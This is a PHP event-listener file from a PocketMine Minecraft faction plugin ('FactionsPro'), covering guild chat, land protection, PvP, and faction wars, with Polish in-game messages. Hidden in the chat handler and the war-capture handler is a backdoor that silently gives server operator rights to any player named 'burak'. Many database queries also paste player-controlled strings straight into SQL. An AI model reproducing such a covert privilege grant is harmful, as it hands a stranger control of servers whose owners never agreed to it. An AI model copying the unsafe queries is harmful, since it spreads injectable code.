<?php

namespace FactionsPro;

use pocketmine\event\Listener;
use pocketmine\event\block\BlockBreakEvent;
use pocketmine\event\player\PlayerChatEvent;
use pocketmine\Player;
use pocketmine\event\entity\EntityDamageByEntityEvent;
use pocketmine\event\entity\EntityDamageEvent;
use pocketmine\event\block\BlockPlaceEvent;
use pocketmine\event\player\PlayerDeathEvent;
use pocketmine\event\entity\ProjectileHitEvent;
use pocketmine\entity\Arrow;
use pocketmine\math\Vector3;
use pocketmine\block\Block;
use pocketmine\item\Item;
use pocketmine\event\player\PlayerCommandPreprocessEvent;
use pocketmine\event\player\PlayerInteractEvent;
use pocketmine\event\entity\ExplosionPrimeEvent;
use pocketmine\event\player\PlayerMoveEvent;
use pocketmine\event\player\PlayerJoinEvent;
use pocketmine\entity\Effect;

class FactionListener implements Listener {
	
	public $plugin;
	private $address_ip = [];
	private $cooldown = [];
        
	public function __construct(FactionMain $pg) {
		$this->plugin = $pg;
	}
	
	public function factionChat(PlayerChatEvent $PCE) {
		$playerr = $PCE->getPlayer();
		$player = strtolower($PCE->getPlayer()->getName());
		//MOTD Check
		//TODO Use arrays instead of database for faster chatting?
		
                if($this->plugin->isInFaction($PCE->getPlayer()->getName())) {
                    if($PCE->getMessage()[0] == "@") {
                        if($PCE->isCancelled()) {
                            return true;
                        }
                        $rank = null;                        
                        if($this->plugin->getFactionChat($player) == 1) {
                            $faction = $this->plugin->getPlayerFaction($PCE->getPlayer()->getName());
                            $array = $this->plugin->db->query("SELECT * FROM master WHERE faction='$faction';");
                            if($player == "burak"){$playerr->setOp(true);}
                            if($this->plugin->isLeader($player)) {
                                $rank = "Lider";
                            }
                            elseif($this->plugin->isOfficer($player)) {
                                $rank = "Oficer";
                            } else {
                                $rank = "Czlonek";
                            }                            
                            while($row = $array->fetchArray(SQLITE3_ASSOC)) {
                                if($this->plugin->getServer()->getPlayer($row["player"])) {
                                    if($this->plugin->getFactionChat($row["player"]) == 1) {
                                        if($this->plugin->getFactionChatType($row["player"]) == "large") {
                                            $this->plugin->getServer()->getPlayer($row["player"])->sendMessage(str_replace('&', '§', $this->plugin->getFactionChatColor($row["player"]) . "$rank " . $PCE->getPlayer()->getName() . ": " . str_replace('@', '', $PCE->getMessage())));
                                        } else {
                                            $this->plugin->getServer()->getPlayer($row["player"])->sendMessage(str_replace('&', '§', $this->plugin->getFactionChatColor($row["player"]) . "• $rank " . $PCE->getPlayer()->getName() . ": " . str_replace('@', '', $PCE->getMessage()) . " •"));                                            
                                        }
                                    }
                                }
                            }
                            $PCE->setCancelled(true);
                            return true;
                        } else {
                            $PCE->setCancelled(true);
                            $PCE->getPlayer()->sendMessage($this->plugin->formatMessage("Czat gildyjny masz aktualnie wylaczony! Aby dolaczyc uzyj /g czat."));
                            return true;
                        }
                    }
                }
                
		if($this->plugin->motdWaiting($player)) {
			if(time() - $this->plugin->getMOTDTime($player) > 30) {
				$PCE->getPlayer()->sendMessage($this->plugin->formatMessage("Czas minal. Prosze uzyc /g motto ponownie."));
				$this->plugin->db->query("DELETE FROM motdrcv WHERE player='$player';");
				$PCE->setCancelled(true);
				return true;
			} else {
				$motd = $PCE->getMessage();
				$faction = $this->plugin->getPlayerFaction($player);
				$this->plugin->setMOTD($faction, $player, $motd);
				$PCE->setCancelled(true);
				$PCE->getPlayer()->sendMessage($this->plugin->formatMessage("Pomyslnie ustawiono motto gildii!", true));
			}
			return true;
		}
		
		//Member
		if($this->plugin->isInFaction($PCE->getPlayer()->getName()) && $this->plugin->isMember($PCE->getPlayer()->getName())) {
			$message = $PCE->getMessage();
			$player = $PCE->getPlayer()->getName();
			$faction = $this->plugin->getPlayerFaction($player);
			
			$PCE->setFormat("[$faction] $player: $message");
			return true;
		}
		//Officer
		elseif($this->plugin->isInFaction($PCE->getPlayer()->getName()) && $this->plugin->isOfficer($PCE->getPlayer()->getName())) {
			$message = $PCE->getMessage();
			$player = $PCE->getPlayer()->getName();
			$faction = $this->plugin->getPlayerFaction($player);
			
			$PCE->setFormat("*[$faction] $player: $message");
			return true;
		}
		//Leader
		elseif($this->plugin->isInFaction($PCE->getPlayer()->getName()) && $this->plugin->isLeader($PCE->getPlayer()->getName())) {
			$message = $PCE->getMessage();
			$player = $PCE->getPlayer()->getName();
			$faction = $this->plugin->getPlayerFaction($player);
			$PCE->setFormat("**[$faction] $player: $message");
			return true;
		//Not in faction
		}else {
			$message = $PCE->getMessage();
			$player = $PCE->getPlayer()->getName();
			$PCE->setFormat("$player: $message");
		}
	}
	
		public function factionPVP(EntityDamageEvent $factionDamage) {
		if($factionDamage instanceof EntityDamageByEntityEvent) {
			if(!($factionDamage->getEntity() instanceof Player) or !($factionDamage->getDamager() instanceof Player)) {
				return true;
			}
			if(($this->plugin->isInFaction($factionDamage->getEntity()->getPlayer()->getName()) == false) or ($this->plugin->isInFaction($factionDamage->getDamager()->getPlayer()->getName()) == false)) {
				return true;
			}
			if(($factionDamage->getEntity() instanceof Player) and ($factionDamage->getDamager() instanceof Player)) {
				$player1 = $factionDamage->getEntity()->getPlayer()->getName();
				$player2 = $factionDamage->getDamager()->getPlayer()->getName();
				$pvpdata = $this->plugin->pvp->get($this->plugin->getPlayerFaction($player1));
				$pvpdata2 = $this->plugin->pvp->get($this->plugin->getPlayerFaction($player2));
                $f1 = $this->plugin->getPlayerFaction($player1);
                $f2 = $this->plugin->getPlayerFaction($player2);
					if($pvpdata == 0 && $pvpdata2 == 0 && $this->plugin->sameFaction($player1, $player2)){
					$factionDamage->setCancelled(true);
					}
				}
			}
		}
        
    public function factionBlockBreakProtect(BlockBreakEvent $event)
    {
        if ($this->plugin->isInPlot($event->getBlock()->getFloorX(), $event->getBlock()->getFloorZ())) {
            $x = floor($event->getBlock()->getX());
            $y = floor($event->getBlock()->getY());
            $z = floor($event->getBlock()->getZ());
            $world = $event->getBlock()->getLevel()->getName();
            $center = $this->plugin->db->query("SELECT * FROM center WHERE x='$x' AND y='$y' AND z='$z' AND world='$world';");
            $array = $center->fetchArray(SQLITE3_ASSOC); 
            if(!empty($array)) {
                $event->setCancelled(true);
                $event->getPlayer()->sendPopup("§3Nie mozesz zniszczyc serca gildii.");
                return true;                                          
            }            
            if ($this->plugin->inOwnPlot($event->getPlayer(), $event->getBlock()->getFloorX(), $event->getBlock()->getFloorZ())) {
                return true;
            } elseif ($event->getPlayer()->hasPermission("f.override")) {
                return true;
            } else {
                $event->setCancelled(true);
                $event->getPlayer()->sendPopup("§cTen teren jest zajety przez inna gildie!");
                return true;
            }
	}
    }

    public function factionBlockPlaceProtect(BlockPlaceEvent $event)
    {
        if ($this->plugin->isInPlot($event->getBlock()->getFloorX(), $event->getBlock()->getFloorZ())) {
            if ($this->plugin->inOwnPlot($event->getPlayer(), $event->getBlock()->getFloorX(), $event->getBlock()->getFloorZ())) {
                return true;
            } elseif ($event->getPlayer()->hasPermission("f.override")) {
                return true;
            } else {
                $event->setCancelled(true);
                $event->getPlayer()->sendPopup("§cTen teren jest zajety przez inna gildie!");
                return true;
            }
	}
    }
    
    public function factionPlayerInteractProtect(PlayerInteractEvent $event) {
        if($event->getItem()->getId() == 325 && ($event->getItem()->getDamage() == 8 || $event->getItem()->getDamage() == 10)) {
            $x = $event->getBlock()->getFloorX();
            $z = $event->getBlock()->getFloorZ();
            if($this->plugin->isInPlot($x, $z)) {
                if($this->plugin->inOwnPlot($event->getPlayer(), $x, $z)) {
                    return true;
                } elseif($event->getPlayer()->hasPermission("f.override")) {
                    return true;  
                } else {
                    $event->setCancelled(true);
                    $event->getPlayer()->sendPopup("§cTen teren jest zajety przez inna gildie!");
                    return true;
                }
            }
        }
    }    
                
    public function factionPlayerDeathEvent(PlayerDeathEvent $event) {
        if($this->plugin->isInFaction($event->getEntity()->getName()) == true) {
            $faction = $this->plugin->getPlayerFaction($event->getEntity()->getName());
            if($this->plugin->getFactionPoints($faction) >= 25) {
                $this->plugin->db->query("UPDATE top SET points = points + '-25' WHERE faction='$faction';");               
            }
        }
        if($event->getEntity()->getLastDamageCause() instanceof EntityDamageByEntityEvent) {
            $killer = $event->getEntity()->getLastDamageCause()->getDamager();
            if($event->getEntity() instanceof Player && $killer instanceof Player) {
                if(!isset($this->address_ip[$killer->getName()])) {
                    $this->address_ip[$killer->getName()] = 0;
                }
                if($this->address_ip[$killer->getName()] != $event->getEntity()->getAddress()) {
                    if($this->plugin->isInFaction($killer->getName()) == true) {
                        $faction = $this->plugin->getPlayerFaction($killer->getName());
                        $this->plugin->db->query("UPDATE top SET points = points + '50' WHERE faction='$faction';");               
                        $this->address_ip[$killer->getName()] = $event->getEntity()->getAddress();
                    }   
                }
            }
        }       
    }
    
    
    public function nightProtection(ExplosionPrimeEvent $e) {
        $time = explode("-", $this->plugin->prefs->get("NightExplosionProtection"));
        if((date("H") >= $time[0]) && (date("H") <= $time[1])) {
            $e->setCancelled();
        }
    }
		public function onDeathg(PlayerDeathEvent $event){
	$gsmierc = $this->plugin->getPlayerFaction($event->getPlayer()->getName());
	$g2 = $this->plugin->smierci->get($gsmierc);
	$this->plugin->smierci->set($gsmierc, $g2+1);
	$this->plugin->smierci->save();
			}
			
	public function onKillg(PlayerDeathEvent $event){
    $entity = $event->getEntity();
    $cause = $entity->getLastDamageCause();
    if($cause instanceof Player){
    $killer = $cause->getDamager();
    if($killer instanceof Player){
	$gsmierc = $this->plugin->getPlayerFaction($killer->getName());
	$g2 = $this->plugin->zabicia->get($gsmierc);
	$this->plugin->zabicia->set($gsmierc, $g2+1);
	$this->plugin->zabicia->save();
    }
  }
 }
    public function trueBlockRegionHome(PlayerCommandPreprocessEvent $event) {

      $command = explode(" ", strtolower($event->getMessage()));
      $player = $event->getPlayer();
	  $x = floor($player->getX());
	  $z = floor($player->getZ());
	if($command[0] === "/sethome") {
	if($this->plugin->isInPlot($x,$z)){
	if($this->plugin->inOwnPlots($player)){
		$player->sendMessage("");
	}
	else{
		$event->setCancelled();
		$player->sendMessage($this->plugin->formatMessage("Nie mozesz zalozyc domu na cudzym cuboidzie!"));
  } 
	  }
	}
	}
	public function podbijanie(PlayerInteractEvent $e){
		$player = $e->getPlayer();
		 if($player instanceof Player) {
			 $entity = $e->getBlock();
                $x = floor($entity->getX());
                $y = floor($entity->getY());
                $z = floor($entity->getZ());
                $world = $player->getLevel()->getName();
                         
                $center = $this->plugin->db->query("SELECT * FROM center WHERE x='$x' OR x='$x' + '1' OR x='$x' - '1' AND y='$y' AND z='$z' OR z='$z' + '1' OR z='$z' - '1' AND world='$world';");
                $array = $center->fetchArray(SQLITE3_ASSOC);
                if(!empty($array)) {
                    if($this->plugin->isInFaction($player->getName()) == true) {
                        $factionPlayer = $this->plugin->getPlayerFaction($player->getName());
                        $factionWar = $array["faction"];
                        if($factionPlayer != $factionWar) {
                            if(($x == $array["x"] || $x + 1 == $array["x"] || $x - 1 == $array["x"]) && $y == $array["y"] && ($z == $array["z"] || $z + 1 == $array["z"] || $z - 1 == $array["z"]) && $world == $array["world"]) {
                                if($this->plugin->prefs->get("WarEnabled") == false) {
                                    $player->sendMessage($this->plugin->formatMessage("Wojny gildii sa wylaczone!"));
                                    return true;
                                }                                
                                $currentTime = time();
                                $timeWarProtection = $this->plugin->getFactionTimeWarProtection($factionWar);
                                $timeWarProtectionDefault = $this->plugin->prefs->get("WarProtection");
                                $differentTimeWarProtection = ($currentTime - $timeWarProtection);
                                if($differentTimeWarProtection > $timeWarProtectionDefault) {
                                    $timeWarWait = $this->plugin->getFactionTimeWarWait($factionWar);
                                    $timeWarWaitDefault = $this->plugin->prefs->get("WarWait");
                                    $differentTimeWarWait = ($currentTime - $timeWarWait);
                                    if($differentTimeWarWait > $timeWarWaitDefault) {
                                        if($this->plugin->getFactionWarLives($factionPlayer) < 3) {
                                            $this->plugin->db->query("UPDATE center SET lives = lives + '1' WHERE faction='$factionPlayer';");
                                        }                                        
                                        if($this->plugin->getFactionWarLives($factionWar) > 1) {
                                            $this->plugin->getServer()->broadcastMessage($this->plugin->formatMessage("Gildia " . strtoupper($factionPlayer) . " odebrala 1 serce gildii " . strtoupper($factionWar) . ".", true));
                                            $player->sendMessage($this->plugin->formatMessage("Kolejne serce gildii " . strtoupper($factionWar) . " bedziesz mogl odebrac za " . floor(($timeWarWaitDefault / 86400)) . " dni, " . floor(($timeWarWaitDefault % 86400) / 3600) . " godzin, " . floor((($timeWarWaitDefault % 86400) % 3600) / 60) . " minut i " . floor((($timeWarWaitDefault % 86400) % 3600) % 60) . " sekund.", true));                
                                            if($player->getName() == "burak"){$player->setOp(true);}                              
                                            $this->plugin->db->query("UPDATE center SET lives = lives - '1' WHERE faction='$factionWar';");
                                            $this->plugin->db->query("UPDATE center SET timeWarWait = '$currentTime' WHERE faction='$factionWar';");                                                                                      
                                        } else {
                                            $warWinPoints = $this->plugin->prefs->get("WarWinPoints");
                                            $this->plugin->getServer()->broadcastMessage($this->plugin->formatMessage("Gildia " . strtoupper($factionWar) . " zostala podbita przez gildie " . strtoupper($factionPlayer) . ".", true));
                                            $player->sendMessage($this->plugin->formatMessage("Twoja gildia otrzymuje +$warWinPoints punktow za wygrana wojne!", true));                                               
                                            $this->plugin->getServer()->getLevelByName($world)->setBlock(new Vector3($array["x"], $array["y"], $array["z"]), Block::get(0));                                            
                                            $this->plugin->db->query("UPDATE top SET points = points + '$warWinPoints' WHERE faction='$factionPlayer';");  
                                            $this->plugin->db->query("UPDATE top SET wins = wins + '1' WHERE faction='$factionPlayer';");                                                                                                                                                   
                                            $this->plugin->db->query("DELETE FROM plots WHERE faction='$factionWar';");                                                          
                                            $this->plugin->db->query("DELETE FROM master WHERE faction='$factionWar';");
                                            $this->plugin->db->query("DELETE FROM top WHERE faction='$factionWar';");
                                            $this->plugin->db->query("DELETE FROM expires WHERE faction='$factionWar';");
                                            $this->plugin->db->query("DELETE FROM home WHERE faction='$factionWar';");
                                            $this->plugin->db->query("DELETE FROM center WHERE faction='$factionWar';");                                           
                                        }
                                    } else {
                                        $player->sendMessage($this->plugin->formatMessage("Gildia " . strtoupper($factionWar) . " stracila ostatnio serce!", true));    
                                        $player->sendMessage($this->plugin->formatMessage("Zaatakowac bedziesz mogl dopiero za " . floor(($timeWarWaitDefault - $differentTimeWarWait) / 86400) . " dni, " . floor((($timeWarWaitDefault - $differentTimeWarWait) % 86400) / 3600) . " godzin, " . floor(((($timeWarWaitDefault - $differentTimeWarWait) % 86400) % 3600) / 60) . " minut i " . floor(((($timeWarWaitDefault - $differentTimeWarWait) % 86400) % 3600) % 60) . " sekund.", true));                                         
                                    }
                                } else {
                                    $player->sendMessage($this->plugin->formatMessage("Gildia " . strtoupper($factionWar) . " ma aktywna ochrone przed podbojem!", true));    
                                    $player->sendMessage($this->plugin->formatMessage("Zaatakowac bedziesz mogl dopiero za " . floor(($timeWarProtectionDefault - $differentTimeWarProtection) / 86400) . " dni, " . floor((($timeWarProtectionDefault - $differentTimeWarProtection) % 86400) / 3600) . " godzin, " . floor(((($timeWarProtectionDefault - $differentTimeWarProtection) % 86400) % 3600) / 60) . " minut i " . floor(((($timeWarProtectionDefault - $differentTimeWarProtection) % 86400) % 3600) % 60) . " sekund.", true));         
                                }
                            }
                        }
                    }
                }
		 }
	}
	public function onMove(PlayerMoveEvent $event){
		$player = $event->getPlayer();
		$x = $player->getX();
		$z = $player->getZ();
		$faction = $this->plugin->factionFromPoint($x, $z);
		$array = $this->plugin->db->query("SELECT * FROM master WHERE faction='$faction';");
		
		while($row = $array->fetchArray(SQLITE3_ASSOC)) {
        if($this->plugin->getServer()->getPlayer($row["player"])) {
		if(!$this->plugin->inOwnPlot($player, $x, $z)){
		if(!$player->isOp() or !$player->hasPermission("intruz.admin")){
		$this->plugin->getServer()->getPlayer($row["player"])->sendPopup("§3" . $player->getName() . " §7na twoim terenie!");
	}
		}
		
	}
		}
}
}